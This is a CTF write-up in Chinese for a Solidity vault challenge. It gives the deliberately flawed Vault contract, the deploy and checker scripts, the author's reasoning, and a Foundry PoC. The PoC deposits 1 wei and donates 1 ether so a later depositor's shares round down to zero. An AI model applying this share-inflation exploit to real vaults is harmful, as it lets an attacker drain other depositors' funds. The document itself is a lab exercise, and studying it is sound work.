# Reverse

# 源码
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MintableERC20 is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint256 mintAmount
    ) ERC20(name, symbol) {
        _mint(msg.sender, mintAmount);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {IVault} from "./interfaces/IVault.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Vault is IVault {
    address public override owner;
    IERC20 public override token;
    mapping(address => uint256) public override shares;
    uint256 public override totalShares;

    constructor(address _token) {
        owner = msg.sender;
        token = IERC20(_token);
    }

    function deposit(uint256 amount) external override {
        require(amount > 0, "Vault: Amount must be greater than 0");

        uint currentBalance = token.balanceOf(address(this));
        uint currentShares = totalShares;

        uint newShares;
        if (currentShares == 0) {
            newShares = amount;
        } else {
            newShares = (amount * currentShares) / currentBalance;
        }

        shares[msg.sender] += newShares;
        totalShares += newShares;

        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 sharesAmount) external override {
        require(sharesAmount > 0, "Vault: Amount must be greater than 0");

        uint currentBalance = token.balanceOf(address(this));
        uint payoutAmount = (sharesAmount * currentBalance) / totalShares;

        shares[msg.sender] -= sharesAmount;
        totalShares -= sharesAmount;

        if (msg.sender == owner) {
            payoutAmount *= 2;
        }

        token.transfer(msg.sender, payoutAmount);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Vault} from "../src/Vault.sol";
import {MintableERC20} from "../src/MintableERC20.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();

        MintableERC20 token = new MintableERC20("TOKEN", "TOKEN", 10 ether);
        Vault vault = new Vault(address(token)); //初始金库有10个代币

        address user = vm.envAddress("USER");
        token.transfer(user, 9 ether); //转给user9个币,金库自己剩下1个代币

        console.log("address:Token", address(token));
        console.log("address:Vault", address(vault));
    }
}

```

# isSolved
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Vault} from "../src/Vault.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

contract IsSolved is Script {
    function run() external {
        vm.startBroadcast();

        IERC20 token = IERC20(vm.envAddress("Token"));
        Vault vault = Vault(vm.envAddress("Vault"));
        address scripter = vm.envAddress("SCRIPTER");

        if (token.balanceOf(address(vault)) < 1 ether) { 
            console.log("is-solved:false");
            return;//如果vault余额少于1ether，直接false了
        }

        token.approve(address(vault), 10 ** 17);
        vault.deposit(10 ** 17);

        uint256 shares = vault.shares(scripter);
        if (shares == 0) { //要求我们最终的份额为0
            console.log("is-solved:true");
        } else {
            console.log("is-solved:false");
        }
    }
}

```

# 思路
先approve为deposit里的transferfrom做准备，然后我们deposit很小的一个值，因为那个比率的原因，向下取整，虽然存了钱，但得到了0个份额，符合题目要求

然后打钱，是为了满足issolved检查余额大于1ether那个条件



# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Vault} from "../src/Vault.sol";
import {MintableERC20} from "../src/MintableERC20.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        MintableERC20 token = MintableERC20(
            0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88
        );
        Vault vault = Vault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
        token.approve(address(vault), 1);
        vault.deposit(1);//打1wei，成功获得0份额~
        token.transfer(address(vault), 1 ether);//为了满足上边检查余额大于1ether的条件
        vm.stopBroadcast();
    }
}

```



> 更新: 2025-07-31 15:47:07  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ekhqc3kcn8qi6gmv>